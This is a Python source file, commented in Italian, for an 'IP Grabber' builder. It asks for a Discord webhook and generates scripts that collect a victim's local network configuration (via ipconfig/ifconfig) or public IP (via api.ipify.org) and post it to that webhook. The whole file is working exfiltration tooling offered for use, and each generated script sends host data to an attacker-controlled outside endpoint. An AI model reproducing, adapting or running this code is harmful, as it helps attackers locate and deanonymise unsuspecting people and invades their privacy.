import requests

def create_local_ip_script(webhook_url):
    """Crea uno script Python per ottenere l'IP locale e inviarlo al webhook Discord."""
    script_content = f'''
import requests
import os

def get_local_ip():
    try:
        local_ip = os.popen('ipconfig' if os.name == 'nt' else 'ifconfig').read()
        return local_ip
    except Exception as e:
        return f"Errore: {{e}}"

def send_to_discord(webhook_url, message):
    try:
        payload = {{"content": message}}
        response = requests.post(webhook_url, json=payload)
        response.raise_for_status()
        print("Messaggio inviato al webhook Discord.")
    except requests.RequestException as e:
        print(f"Errore durante l'invio: {{e}}")

if __name__ == "__main__":
    local_ip = get_local_ip()
    if local_ip:
        send_to_discord("{webhook_url}", f"Local IP: {{local_ip}}")
    else:
        print("Impossibile ottenere l'IP locale.")
'''
    with open("local_ip_grabber.py", "w") as file:
        file.write(script_content)
    print("Script per IP locale creato come 'local_ip_grabber.py'.")

def create_public_ip_script(webhook_url):
    """Crea uno script Python per ottenere l'IP pubblico e inviarlo al webhook Discord."""
    script_content = f'''
import requests

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org")
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        return f"Errore: {{e}}"

def send_to_discord(webhook_url, message):
    try:
        payload = {{"content": message}}
        response = requests.post(webhook_url, json=payload)
        response.raise_for_status()
        print("Messaggio inviato al webhook Discord.")
    except requests.RequestException as e:
        print(f"Errore durante l'invio: {{e}}")

if __name__ == "__main__":
    public_ip = get_public_ip()
    if public_ip:
        send_to_discord("{webhook_url}", f"Public IP: {{public_ip}}")
    else:
        print("Impossibile ottenere l'IP pubblico.")
'''
    with open("public_ip_grabber.py", "w") as file:
        file.write(script_content)
    print("Script per IP pubblico creato come 'public_ip_grabber.py'.")

def menu():
    """Menu principale per selezionare l'opzione desiderata."""
    while True:
        print("""
        ████ Menu IP Grabber ████
        [1] Crea script per IP Locale
        [2] Crea script per IP Pubblico
        [3] Esci
        """)
        choice = input("Scegli un'opzione: ").strip()

        if choice == "1":
            webhook_url = input("Inserisci il webhook di Discord: ").strip()
            if not webhook_url:
                print("Il webhook di Discord è obbligatorio.")
                continue
            create_local_ip_script(webhook_url)

        elif choice == "2":
            webhook_url = input("Inserisci il webhook di Discord: ").strip()
            if not webhook_url:
                print("Il webhook di Discord è obbligatorio.")
                continue
            create_public_ip_script(webhook_url)

        elif choice == "3":
            print("Uscita dal programma.")
            break

        else:
            print("Scelta non valida. Riprova.")

if __name__ == "__main__":
    menu()
